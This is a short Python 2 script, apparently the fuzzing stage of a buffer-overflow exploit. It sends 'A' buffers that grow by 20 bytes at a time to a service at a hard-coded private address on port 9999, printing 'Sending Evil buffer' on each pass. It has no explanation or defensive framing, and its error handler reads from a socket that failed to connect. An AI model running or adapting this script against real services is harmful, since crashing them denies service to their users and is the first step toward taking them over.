#! /usr/bin/python
import socket 
import sys 

def exploit(buff):
	
	payload = '\x41' * int(buff)
	print "Sending Evil buffer --> " + str(len(payload)) + " bytes"
	connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	try:
		connect.connect(("192.168.10.101",9999))

        except:

                print "[-] Connection Error"
                response = connect.recv(2000)
                print response
                sys.exit(1)

	connect.recv(2000)
	connect.send(payload + ' ' + '\r\n')
	connect.close()

if __name__ == '__main__':

	try:
		buff = sys.argv[1]
	
	except IndexError:
		print 'Usage: %s <buffer>' % sys.argv[0]
		sys.exit(-1)

	for i in range(20,int(buff),20):
		exploit(i)



